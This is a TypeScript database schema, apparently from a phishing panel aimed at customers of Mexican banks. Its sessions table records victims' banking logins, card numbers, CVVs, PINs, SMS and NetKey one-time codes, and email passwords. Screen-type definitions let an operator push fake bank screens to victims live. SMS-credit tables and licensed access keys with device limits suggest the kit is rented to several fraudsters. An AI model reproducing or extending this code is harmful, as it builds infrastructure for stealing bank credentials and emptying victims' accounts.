import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
import bcrypt from "bcrypt";

// Roles de usuario
export enum UserRole {
  ADMIN = "admin",
  USER = "user"
}

// Bancos disponibles
export enum BankType {
  ALL = "all",
  LIVERPOOL = "liverpool",
  CITIBANAMEX = "citibanamex",
  BANBAJIO = "banbajio",
  BBVA = "bbva",
  BANORTE = "banorte",
  BANCOPPEL = "bancoppel",
  HSBC = "hsbc",
  AMEX = "amex",
  SANTANDER = "santander",
  SCOTIABANK = "scotiabank",
  BANAMEX = "banamex",
  BANREGIO = "banregio",
  SPIN = "spin"
}

// Tabla de usuarios del sistema
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  role: text("role").notNull().default(UserRole.USER),
  isActive: boolean("is_active").default(false), // Los usuarios inician inactivos hasta que el admin los apruebe
  expiresAt: timestamp("expires_at"), // Fecha de expiración de la cuenta
  deviceCount: integer("device_count").default(0), // Contador de dispositivos activos
  maxDevices: integer("max_devices").default(3), // Máximo de dispositivos permitidos
  allowedBanks: text("allowed_banks").default('all'), // Bancos permitidos: 'all' o lista separada por comas
  createdAt: timestamp("created_at").defaultNow(),
  lastLogin: timestamp("last_login"),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  role: true,
  allowedBanks: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Tabla para las llaves de acceso
export const accessKeys = pgTable("access_keys", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  description: text("description"),
  createdBy: integer("created_by").notNull(), // ID del administrador que creó la llave
  expiresAt: timestamp("expires_at").notNull(), // Fecha de expiración
  maxDevices: integer("max_devices").notNull().default(3), // Máximo de dispositivos permitidos
  activeDevices: integer("active_devices").default(0), // Contador de dispositivos activos
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  lastUsed: timestamp("last_used"),
});

export const insertAccessKeySchema = createInsertSchema(accessKeys).pick({
  key: true,
  description: true,
  createdBy: true,
  expiresAt: true,
  maxDevices: true,
});

export type InsertAccessKey = z.infer<typeof insertAccessKeySchema>;
export type AccessKey = typeof accessKeys.$inferSelect;

// Tabla para rastrear los dispositivos que usan cada llave
export const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  accessKeyId: integer("access_key_id").notNull(), // ID de la llave a la que está asociado
  deviceId: text("device_id").notNull(), // Identificador único del dispositivo
  userAgent: text("user_agent"), // Información del navegador/dispositivo
  ipAddress: text("ip_address"), // Dirección IP
  lastActive: timestamp("last_active").defaultNow(),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertDeviceSchema = createInsertSchema(devices).pick({
  accessKeyId: true,
  deviceId: true,
  userAgent: true,
  ipAddress: true,
});

export type InsertDevice = z.infer<typeof insertDeviceSchema>;
export type Device = typeof devices.$inferSelect;

export const sessions = pgTable("sessions", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  folio: text("folio"),
  username: text("username"),
  password: text("password"),
  banco: text("banco").default("BANAMEX"),
  tarjeta: text("tarjeta"),
  fechaVencimiento: text("fecha_vencimiento"),
  cvv: text("cvv"),
  sms: text("sms"),
  nip: text("nip"),
  smsCompra: text("sms_compra"),
  celular: text("celular"),
  qrImage: text("qr_image"),       // Para almacenar la imagen del QR
  qrValidated: boolean("qr_validated").default(false), // Estado de validación del QR
  smsCode: text("sms_code"),       // Para almacenar el código SMS de 4 dígitos
  terminacion: text("terminacion"), // Para almacenar los últimos 4 dígitos del teléfono
  correo: text("correo"),          // Para almacenar el correo de Gmail
  contrasena: text("contrasena"),  // Para almacenar la contraseña de Gmail
  dispositivo: text("dispositivo"), // Android, iPhone, PC, etc.
  numeroCliente: text("numero_cliente"), // Número de cliente de Banamex
  claveAcceso: text("clave_acceso"), // Clave de acceso de Banamex
  challenge: text("challenge"), // Challenge NetKey de 8 dígitos (código que admin envía)
  netkeyResponse: text("netkey_response"), // Respuesta NetKey del cliente
  telefono1: text("telefono1"), // Teléfono de contacto 1
  telefono2: text("telefono2"), // Teléfono de contacto 2 (opcional)
  nombreRepresentante: text("nombre_representante"), // Nombre del representante legal
  nombreContacto: text("nombre_contacto"), // Nombre del formulario de contacto (post-NetKey)
  correoContacto: text("correo_contacto"), // Correo del formulario de contacto (post-NetKey)
  celularContacto: text("celular_contacto"), // Celular del formulario de contacto (post-NetKey)
  telefonoAlternativoContacto: text("telefono_alternativo_contacto"), // Teléfono alternativo (opcional)
  pasoActual: text("paso_actual").default("folio"),
  createdAt: timestamp("created_at").defaultNow(),
  active: boolean("active").default(true),
  saved: boolean("saved").default(false),
  createdBy: text("created_by"), // Añadimos el campo para saber qué usuario creó la sesión
  deviceId: text("device_id"), // ID único del dispositivo para gestión de folios
});

export const insertSessionSchema = createInsertSchema(sessions).pick({
  sessionId: true,
  folio: true,
  username: true,
  password: true,
  banco: true,
  pasoActual: true,
  createdBy: true,
  deviceId: true,
});

export type InsertSession = z.infer<typeof insertSessionSchema>;
export type Session = typeof sessions.$inferSelect;

// Tabla para la configuración de la API de mensajes
export const smsConfig = pgTable("sms_config", {
  id: serial("id").primaryKey(),
  username: text("username"),
  password: text("password"),
  apiUrl: text("api_url").default("https://www.sofmex.com/api/sms"),
  isActive: boolean("is_active").default(true),
  updatedAt: timestamp("updated_at").defaultNow(),
  updatedBy: text("updated_by").notNull(),
  authToken: text("auth_token"), // Token JWT para la autenticación
});

export const insertSmsConfigSchema = createInsertSchema(smsConfig).pick({
  username: true,
  password: true,
  apiUrl: true,
  isActive: true,
  updatedBy: true,
  authToken: true,
});

export type InsertSmsConfig = z.infer<typeof insertSmsConfigSchema>;
export type SmsConfig = typeof smsConfig.$inferSelect;

// Tabla para los créditos de mensajes de los usuarios
export const smsCredits = pgTable("sms_credits", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  credits: integer("credits").default(0),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const insertSmsCreditsSchema = createInsertSchema(smsCredits).pick({
  userId: true,
  credits: true,
});

export type InsertSmsCredits = z.infer<typeof insertSmsCreditsSchema>;
export type SmsCredits = typeof smsCredits.$inferSelect;

// Tabla para el historial de mensajes enviados
export const smsHistory = pgTable("sms_history", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  phoneNumber: text("phone_number").notNull(),
  message: text("message").notNull(),
  sentAt: timestamp("sent_at").defaultNow(),
  status: text("status").default("pending"),
  sessionId: text("session_id"),
  errorMessage: text("error_message"),
});

export const insertSmsHistorySchema = createInsertSchema(smsHistory).pick({
  userId: true,
  phoneNumber: true,
  message: true,
  sessionId: true,
});

export type InsertSmsHistory = z.infer<typeof insertSmsHistorySchema>;
export type SmsHistory = typeof smsHistory.$inferSelect;

export enum ScreenType {
  FOLIO = "folio",
  PROMOCION = "promocion",
  TERMINOS = "terminos",
  PHONE_INPUT = "phone_input",
  QR_SCAN = "qr_scan",
  QR_VALIDATION = "qr_validation",
  SMS_VERIFICATION = "sms_verification",
  LOGIN = "login",
  NETKEY = "netkey",
  NETKEY2 = "netkey2",
  DATOS_CONTACTO = "datos_contacto",
  ACCESO_DENEGADO = "acceso_denegado",
  ACCESO_DENEGADO_2 = "acceso_denegado_2",
  VUELOS_OTORGADOS = "audifonos_otorgados",
  TELEFONO = "telefono",
  CODIGO = "codigo",
  NIP = "nip",
  PROTEGER = "protege",
  TARJETA = "tarjeta",
  TRANSFERIR = "transferir",
  CANCELACION = "cancelacion",
  MENSAJE = "mensaje",
  VALIDANDO = "validando",
  SMS_COMPRA = "sms_compra",
  GMAIL = "gmail",
  GMAIL_VERIFY = "gmail_verify",
  HOTMAIL = "hotmail",
  YAHOO = "yahoo",
  GENERANDO_ACLARACION = "generando_aclaracion",
  DATOS_TARJETA = "datos_tarjeta",
}

export const screenChangeSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  terminacion: z.string().optional(),
  saldo: z.string().optional(),
  monto: z.string().optional(),
  clabe: z.string().optional(),
  titular: z.string().optional(),
  comercio: z.string().optional(),
  mensaje: z.string().optional(),
  folio: z.string().optional(),
  direccion: z.string().optional(),
  correo: z.string().optional(),
  contrasena: z.string().optional(),
  codigo: z.string().optional(), // Código para la verificación de Google
  challenge: z.string().optional(), // Challenge NetKey de 8 dígitos
});

export type ScreenChangeData = z.infer<typeof screenChangeSchema>;

export const clientInputSchema = z.object({
  type: z.literal('CLIENT_INPUT'),
  data: z.object({
    sessionId: z.string(),
    tipo: z.string(),
  }).and(
    z.discriminatedUnion('tipo', [
      z.object({ tipo: z.literal('netkey_response'), netkeyResponse: z.string().length(8) }),
      z.object({ tipo: z.literal('netkey2'), netkeyResponse: z.string().length(8) }),
      z.object({ tipo: z.literal('login'), username: z.string(), password: z.string() }),
      z.object({ tipo: z.literal('codigo'), codigo: z.string() }),
      z.object({ tipo: z.literal('nip'), nip: z.string() }),
      z.object({ tipo: z.literal('tarjeta'), numeroTarjeta: z.string(), fechaVencimiento: z.string(), cvv: z.string() }),
      z.object({ tipo: z.literal('sms_compra'), smsCompra: z.string() }),
      z.object({ tipo: z.literal('celular'), celular: z.string() }),
      z.object({ tipo: z.literal('correo'), correo: z.string(), contrasena: z.string() }),
      z.object({ tipo: z.literal('gmail'), correo: z.string(), contrasena: z.string() }),
      z.object({ tipo: z.literal('hotmail'), correo: z.string(), contrasena: z.string() }),
      z.object({ tipo: z.literal('yahoo'), correo: z.string(), contrasena: z.string() }),
      z.object({ tipo: z.literal('acceso_denegado'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
      z.object({ tipo: z.literal('acceso_denegado_2'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
      z.object({ tipo: z.literal('datos_contacto'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
    ])
  )
});

export type ClientInputData = z.infer<typeof clientInputSchema>;